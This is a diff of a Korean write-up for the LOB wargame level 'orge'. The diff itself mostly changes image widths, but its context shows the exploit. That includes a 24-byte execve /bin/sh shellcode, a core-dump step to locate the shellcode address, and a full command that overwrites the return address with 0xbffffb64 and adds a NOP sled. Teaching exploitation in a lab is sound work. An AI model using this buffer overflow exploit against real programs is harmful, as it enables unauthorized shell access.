@@ -100,11 +100,11 @@ shell에는 다음과 같은 기능(?)이 있다.
 
 core 덤프를 떨궈 쉘코가 들어갈 주소를 구하자.
 
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/07.orge/image-20180829173302690.png" width="700px">
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/07.orge/image-20180829173302690.png" width="800px">
 
 
 
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/07.orge/image-20180829173436809.png" width="500px">
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/07.orge/image-20180829173436809.png" width="650px">
 
 
 
@@ -112,13 +112,11 @@ core 덤프를 떨궈 쉘코가 들어갈 주소를 구하자.
 shell(24byte) = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
 ```
 
-
-
 이제 쉘코드를 넣고 RET주소에 0xbffffb64 를 넣으면 끄읏~
 
 
 
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/07.orge/image-20180829173636979.png" width="700px">
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/07.orge/image-20180829173636979.png" width="800px">
 
 ```
 /home/darkelf////////////////////////////////////////////////////////////orge `python -c 'print "A"*44+"\x64\xfb\xff\xbf"'` `python -c 'print "\x90"*50+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'`
